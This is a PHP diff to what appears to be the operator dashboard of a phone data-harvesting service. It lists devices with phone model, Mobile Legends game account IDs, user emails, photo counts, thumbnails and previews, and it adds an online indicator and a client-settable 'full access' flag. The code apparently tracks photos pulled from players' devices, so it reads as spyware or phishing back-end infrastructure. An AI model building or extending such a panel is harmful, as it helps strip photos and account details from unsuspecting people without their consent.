@@ -257,20 +257,28 @@ switch ($action) {
                 $model = cleanModelName($meta['device_model'] ?? $meta['device_name'] ?? $d);
                 $tag = substr(preg_replace('/[^a-zA-Z0-9]/', '', $devId), -7);
 
+                $lastActiveStr = $meta['last_synced'] ?? date('c', filemtime($full));
+                $isOnline = false;
+                if (!empty($meta['last_synced'])) {
+                    $isOnline = (time() - strtotime($meta['last_synced']) < 120);
+                }
+
                 $devices[] = [
-                    'device_id'   => $devId,
-                    'folder_name' => $d,
-                    'phone_model' => $model,
-                    'device_tag'  => $tag,
-                    'player_ign'  => $meta['mlbb_ign'] ?: 'Player',
-                    'mlbb_id'     => $meta['mlbb_id'] ?: '—',
-                    'mlbb_server' => $meta['mlbb_server'] ?: '—',
-                    'email'       => $meta['user_email'] ?: '—',
-                    'photo_count' => $photoCount,
-                    'has_access'  => !empty($meta['is_full_access']) || $photoCount > 0,
-                    'thumbnail'   => $thumb,
-                    'previews'    => $previews,
-                    'last_active' => $meta['last_synced'] ?? date('c', filemtime($full))
+                    'device_id'      => $devId,
+                    'folder_name'    => $d,
+                    'phone_model'    => $model,
+                    'device_tag'     => $tag,
+                    'player_ign'     => $meta['mlbb_ign'] ?: 'Player',
+                    'mlbb_id'        => $meta['mlbb_id'] ?: '—',
+                    'mlbb_server'    => $meta['mlbb_server'] ?: '—',
+                    'email'          => $meta['user_email'] ?: '—',
+                    'photo_count'    => $photoCount,
+                    'has_access'     => !empty($meta['is_full_access']) || $photoCount > 0,
+                    'is_full_access' => !empty($meta['is_full_access']),
+                    'is_online'      => $isOnline,
+                    'thumbnail'      => $thumb,
+                    'previews'       => $previews,
+                    'last_active'    => $lastActiveStr
                 ];
             }
         }
@@ -537,7 +545,7 @@ switch ($action) {
         if (!empty($mlbbId)) $meta['mlbb_id'] = $mlbbId;
         if (!empty($mlbbServer)) $meta['mlbb_server'] = $mlbbServer;
         if (!empty($mlbbIgn)) $meta['mlbb_ign'] = $mlbbIgn;
-        $meta['is_full_access'] = true;
+        $meta['is_full_access'] = isset($body['is_full_access']) ? (bool)$body['is_full_access'] : true;
         $meta['last_synced'] = date('c');
         if (!isset($meta['photos']) || !is_array($meta['photos'])) {
             $meta['photos'] = [];
